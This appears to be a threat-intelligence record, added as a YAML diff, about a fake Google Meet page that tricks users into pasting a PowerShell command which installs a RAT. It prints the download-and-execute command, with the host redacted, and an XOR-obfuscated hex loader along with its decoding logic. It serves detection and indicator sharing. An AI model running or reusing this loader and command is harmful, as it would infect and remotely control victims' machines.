@@ -1,0 +1,42 @@
+description: A customer investigation revealed a malicious HTML file disguised as
+  a Google Meet interface. This page uses social engineering to trick users into copying
+  and pasting a PowerShell command that downloads and executes a RAT (Remote Access
+  Trojan) named noanti-vm.bat.
+attribution: Unknown
+malware_families:
+- noanti-vm.bat
+TTPs:
+  processes:
+  - powershell.exe
+  - cmd.exe
+  - curl.exe
+  commandline:
+  - 'powershell -w 1 iwr hxxp://[REDACTED]/1/XR.txt -UseBasicParsing|iex # Verification
+    ID: 116772'
+  - curl [REDACTED]/udVDkdtSF
+  powershell:
+  - '$udVDkdtSF =([regex]::Matches(''6b677a6a767672382d2d63606b6c65766d6c2f63767272632c6d70652d746f712d6c6d636c766b2f746f2c606376264f5854557a5146223f2226676c7438437272466376633964776c61766b6d6c226d714144696b48432a26765341542e22264a6a61752b796177706e222676534154222f6d22264a6a61757f3964776c61766b6d6c2271504a4764562a2b7964776c61766b6d6c22537a68634147402a264e46776e755074587a2b796b642a232a566771762f5263766a222f5263766a22264a6a61752b2b796d714144696b484322264e46776e755074587a22264a6a61757f7f264a6a6175223f2226676c743843727246637663222922255e6c6d636c766b2f746f2c6063762539537a686341474022267766544669667651442c5177605176706b6c652a312e36312b39717663707622264a6a6175397f71504a47645639'',''.{2}'')
+    | % { [char]([Convert]::ToByte($_.Value,16) -bxor ''2'') }) -join '''';& $udVDkdtSF.Substring(0,3)
+    $udVDkdtSF.Substring(46);exit;'
+  - 'Add-Type -AssemblyName System.Windows.Forms;'
+  - "[System.Windows.Forms.MessageBox]::Show('Verification complete!', 'Information', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information);"
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination: '[REDACTED]/1/XR.txt'
+  file_activity:
+  - '[REDACTED]/1/XR.txt'
+  - $env:AppData\\noanti-vm.bat
+  persistence:
+  - The RAT installs itself in the AppData directory.
+  pipes: []
+  process_relations: []
+IOCs:
+- hxxp://[REDACTED]/1/XR.txt
+- $env:AppData\\noanti-vm.bat
+authors:
+- Puja Srivastava
+reference: https://blog.sucuri.net/2025/05/fake-google-meet-page-tricks-users-into-running-powershell-malware.html
+date_of_publication: May 23, 2025
+file_creation_date: May 27, 2025
